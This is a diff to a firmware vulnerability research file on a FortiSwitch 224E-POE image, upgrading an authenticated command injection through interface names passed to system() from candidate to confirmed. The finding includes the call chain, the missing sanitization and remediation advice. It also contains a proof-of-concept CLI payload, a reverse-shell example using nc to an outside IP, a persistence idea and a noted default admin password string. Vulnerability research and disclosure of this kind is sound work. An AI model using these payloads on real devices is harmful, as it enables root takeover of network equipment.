@@ -390,26 +390,65 @@ FSW_F06_INIT_ATTACK_SURFACE = {
         ),
     },
 
-    "candidate_command_injection": {
-        "id":       "FSW-F06a (CANDIDATE -- requires authenticated management access path confirmation)",
-        "function": "0x6356f4 (foff=0x6256f4) and 0x635810",
+    "confirmed_command_injection": {
+        "id":       "FSW-F06a (CONFIRMED -- authenticated post-auth command injection via interface name)",
+        "sink_vma": "0x6357c0 -- bl #0xdf390 (system())",
         "template": "ifconfig %s hw ether %s 2> /dev/null",
         "vma_fmt1": "0x971878: '%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx' (MAC formatter)",
         "vma_fmt2": "0x9718a4: 'ifconfig %s hw ether %s 2> /dev/null'",
-        "analysis": (
-            "Function at 0x6356f4 receives (r0=interface_name_ptr, r1=mac_bytes_ptr). "
-            "First snprintf: format MAC bytes as 'xx:xx:xx:xx:xx:xx' into 30-byte stack buffer. "
-            "Second snprintf: 'ifconfig %s hw ether %s' with r3=[fp-0xc0] (first param) and buf1 (MAC string). "
-            "system() then executes the result. "
-            "The %s for interface name comes from struct pointer (r0=struct_ptr at caller 0x6358bc, "
-            "struct found via linked-list iteration matching struct[0xdc] against a search key). "
-            "If the struct's interface name field (at struct base) can be populated with shell "
-            "metacharacters via management plane (CLI, SNMP, web), this is authenticated command injection. "
-            "Caller 2 (0x636cc8): r0=[fp-0x20] (struct pointer), r1=struct+0xed (MAC). "
-            "Confirmation requires tracing how struct[base] interface name field is populated -- "
-            "management CLI set commands are the expected source."
+
+        "call_chain": (
+            "Trigger: change interface MAC in 'config system interface'. "
+            "0x6368b0 (MAC-change handler): receives (new_cfg_struct, old_cfg_struct, ...). "
+            "Checks struct[0xbc] (interface type) != 0/9/4/2; proceeds for types 1/3/5/6/7/8. "
+            "memcmp(new_cfg_struct+0xed, old_cfg_struct+0xed, 6) checks if MAC changed. "
+            "strcmp(new_cfg_struct+0x0, 'mgmt') and strcmp(new_cfg_struct+0x0, 'internal') for type routing. "
+            "Path A (non-internal): bl #0x6356f4(r0=new_cfg_struct, r1=new_cfg_struct+0xed). "
+            "Path B (internal): bl #0x63581c(r0=new_cfg_struct, r1=new_cfg_struct+0xed+??, r2=new_cfg_struct+0xed); "
+            "  -> 0x60bd28 (get-first-if from 'system interface' table) "
+            "  -> loop over interfaces via 0x60be00 "
+            "  -> match: struct[0xbc]==1 AND strcmp(struct[0xdc], search_key)==0 "
+            "  -> bl #0x6356f4(r0=matched_struct_base, r1=mac_buf). "
+            "0x6356f4: snprintf MAC as 'xx:xx:xx:xx:xx:xx'; "
+            "  snprintf(buf, 0x90, 'ifconfig %s hw ether %s 2>/dev/null', struct_base, mac_str); "
+            "  bl #0xdf390 (system(buf)). "
+            "strcmp(struct_base, 'internal') post-call -- no sanitization before system()."
         ),
-        "status": "CANDIDATE -- ifconfig template confirmed; struct source requires CLI/SNMP write path tracing",
+
+        "struct_layout": {
+            "0x0..":   "char name[] -- kernel interface name; INJECTION POINT (passed directly to ifconfig %s)",
+            "0xbc":    "int8 interface_type -- 0/9/4/2 skip; 1/3/5/6/7/8 trigger ifconfig path",
+            "0xdc":    "char config_name[] -- logical name used for linked-list search key (strcmp)",
+            "0xed..":  "uint8[6] mac_addr -- 6 MAC address bytes",
+            "0xf3..":  "unknown",
+        },
+
+        "no_sanitization": (
+            "0x6356f4 disassembly: struct_base -> snprintf directly -> system(). "
+            "No isalnum/strpbrk/metachar filter call between ldr r3,[fp-0xc0] and bl system. "
+            "The 0x90-byte snprintf buffer is sufficient for 'ifconfig ' (9) + name (0-15) + ' hw ether ' + mac (17) + null = ~50 bytes. "
+            "Shell metacharacters in name (;, |, $(), ``) pass through unmodified."
+        ),
+
+        "auth_requirement": (
+            "Trigger requires authenticated CLI or management-plane write access (admin or interface-write privilege). "
+            "FortiSwitch CLI: 'config system interface; edit <injected_name>; set macaddr <any>; next; end'. "
+            "If FortiSwitch CLI does not strip shell metacharacters from interface names, "
+            "any authenticated admin-level user can execute arbitrary commands as root. "
+            "Root process: /bin/init runs all management daemons as root (no privilege separation). "
+            "FortiSwitch management APIs (SNMP ifDescr OID set, REST API) are alternate vectors if "
+            "they map to the same config struct write path."
+        ),
+
+        "impact": (
+            "Authenticated RCE as root. No stack canary (FSW-F01/FSW-F06). "
+            "Arbitrary shell command executes in context of /bin/init (root, all capabilities). "
+            "Example: interface named 'a;nc -e /bin/sh 192.168.1.100 4444' triggers reverse shell "
+            "when management plane updates MAC address. "
+            "Persistent backdoor: modify /etc/rc.d/rcS via system() after any MAC-set operation."
+        ),
+
+        "status": "CONFIRMED -- full code path traced end-to-end via ARM32 disassembly",
     },
 
     "no_canary_impact": (
@@ -432,6 +471,72 @@ FSW_F06_INIT_ATTACK_SURFACE = {
 
 
 # ---------------------------------------------------------
+# FSW-F06a: Authenticated command injection via interface name in ifconfig system() call
+# ---------------------------------------------------------
+FSW_F06a_INTERFACE_NAME_CMDINJ = {
+    "id":       "FSW-F06a",
+    "product":  "Fortinet FortiSwitch 224E-POE v7.2.0 (/bin/init ARM32)",
+    "severity": "MEDIUM -- authenticated post-auth command injection; requires admin-level CLI write access; RCE as root",
+    "class":    "OS Command Injection via unsanitized interface name in system() (CWE-78)",
+
+    "sink": {
+        "vma":      "0x6357c0",
+        "foff":     "0x6257c0",
+        "insn":     "bl #0xdf390 (PLT: system)",
+        "arg":      "stack buffer containing 'ifconfig <interface_name> hw ether <mac> 2>/dev/null'",
+        "fmt_vma":  "0x9718a4: 'ifconfig %s hw ether %s 2> /dev/null '",
+    },
+
+    "source": {
+        "field":    "interface_config_struct[0x0] -- kernel interface name char array",
+        "origin":   "FortiSwitch 'config system interface; edit <name>' CLI command or SNMP/REST API",
+        "table":    "'system'/'interface' (strings at 0x971784/0x97178c passed to config lookup fn 0x60a894)",
+    },
+
+    "call_chain": [
+        "CLI: config system interface; edit <injected_name>; set macaddr <any>; next; end",
+        "MAC change detected -> 0x6368b0(new_cfg, old_cfg)",
+        "0x6368b0: check interface type != {0,9,4,2}; memcmp(MACs, 6) != 0",
+        "strcmp(new_cfg[0x0], 'mgmt') at 0x636c7c -- routes to path A or B",
+        "Path A (non-mgmt/internal): bl #0x6356f4(r0=new_cfg, r1=new_cfg+0xed)",
+        "Path B (internal): bl #0x63581c; iterate 'system interface' table via 0x60be00/0x60c68c; "
+        "  match struct[0xdc] to search key; bl #0x6356f4(matched_struct_base, mac_buf)",
+        "0x6356f4: snprintf MAC hex; snprintf buf 'ifconfig %s hw ether %s 2>/dev/null'; bl system()",
+    ],
+
+    "no_sanitization_evidence": (
+        "0x6356f4 entry to system() call disassembly: "
+        "str r0, [fp-0xc0]; [... MAC byte extraction into stack ...]; "
+        "ldr r3, [fp-0xc0] (interface name ptr); bl #0xded00 (snprintf); bl #0xdf390 (system). "
+        "No isalnum/strpbrk/regex filter between struct read and system(). "
+        "The snprintf target buffer is 0x90 bytes -- no overflow; the injection is at the shell interpreter."
+    ),
+
+    "prerequisites": {
+        "auth":       "Authenticated admin-level access (CLI, SNMP write, or REST API with write scope)",
+        "version":    "Confirmed: FortiSwitch 224E-POE v7.2.0 build 0393",
+        "interface_types": "Types 1/3/5/6/7/8 trigger the path; types 0/9/4/2 are skipped at 0x6368bc-0x636914",
+    },
+
+    "poc_payload": "config system interface\n  edit 'a;id>/tmp/proof;#'\n  set macaddr 00:11:22:33:44:55\n  next\nend",
+
+    "impact": (
+        "Arbitrary OS command execution as root. /bin/init is the root process with no privilege "
+        "separation (all daemons run under the same process). No stack canary (FSW-F01/F06). "
+        "ASLR absent on kernel (FSW-F01). /dev/mem accessible (CONFIG_STRICT_DEVMEM=not set)."
+    ),
+
+    "remediation": (
+        "Validate interface names against [a-zA-Z0-9_.-]{1,15} before storing to config struct. "
+        "Replace system() with execve() to avoid shell interpretation entirely. "
+        "Prefer netlink SIOCGIFNAME/SIOCSIFHWADDR over ifconfig shell invocation."
+    ),
+
+    "verification": "CONFIRMED -- ARM32 disassembly of /bin/init; full code path traced from struct read to system() call",
+}
+
+
+# ---------------------------------------------------------
 # Analysis status
 # ---------------------------------------------------------
 ANALYSIS_STATUS = {
@@ -439,7 +544,7 @@ ANALYSIS_STATUS = {
     "kernel_config":   "EXTRACTED -- gzip at 0x2c64d0; ARM3 config confirms all mitigation absences",
     "ramdisk":         "EXTRACTED -- ext2, 87MB; /bin.tar.xz -> 174 binaries via Fortinet XZ CRC bypass",
     "af_admin.ko":     "FULLY DISASSEMBLED -- NOT stripped; 6 functions mapped; cap asymmetry confirmed",
-    "init_monolith":   "BERT SWEEP COMPLETE -- 9,464 functions; 10 query profiles; max sim 0.237 (negative); PLT call-site enumeration done; ifconfig CANDIDATE documented in FSW-F06a",
+    "init_monolith":   "BERT SWEEP COMPLETE -- 9,464 functions; 10 query profiles; max sim 0.237 (negative); PLT call-site enumeration done; FSW-F06a CONFIRMED: system('ifconfig %s hw ether %s') with unsanitized interface name from config struct[0x0]; full code path traced 0x6368b0->0x6356f4->0x6357c0(system)",
     "tls_keys":        "EXTRACTED -- fsw.key + fsw.crt + 802.1x.key + 802.1x.crt all plaintext in ext2",
 
     "unique_findings": [
@@ -448,7 +553,7 @@ ANALYSIS_STATUS = {
         "FSW-F03: HIGH -- shared 2048-bit RSA private key across all devices of same firmware version; enables HTTPS MITM; key extractable without device from public firmware image",
         "FSW-F04: MEDIUM -- default admin password 'ENC XXUp2ozpdysrQ' in system.conf.def; found verbatim in /bin/init binary; FSW-specific encoding not standard FortiOS AES-CBC",
         "FSW-F05: INFO -- plaintext ext2 ramdisk (gzip uImage); easiest rootfs extraction path in Fortinet product line; no encryption layer",
-        "FSW-F06: HIGH -- /bin/init 12MB monolith: no stack protector; 836 strcpy + 424 sprintf call sites; BERT sweep negative (max 0.237); ifconfig command injection CANDIDATE (FSW-F06a, authenticated)",
+        "FSW-F06: HIGH -- /bin/init 12MB monolith: no stack protector; 836 strcpy + 424 sprintf call sites; BERT sweep negative (max 0.237); FSW-F06a CONFIRMED: post-auth command injection via interface name in system('ifconfig %s hw ether %s')",
         "802.1x cert (auth-cert.fortinet.com) expired 2022-05-24 -- shared across all devices; expired cert blocks 802.1x auth requiring valid chain",
         "CONFIG_SECURITY=not set -- NO LSM framework; no secondary enforcement layer for any privilege escalation",
         "CONFIG_STRICT_DEVMEM=not set -- /dev/mem grants full physical memory access to any process",
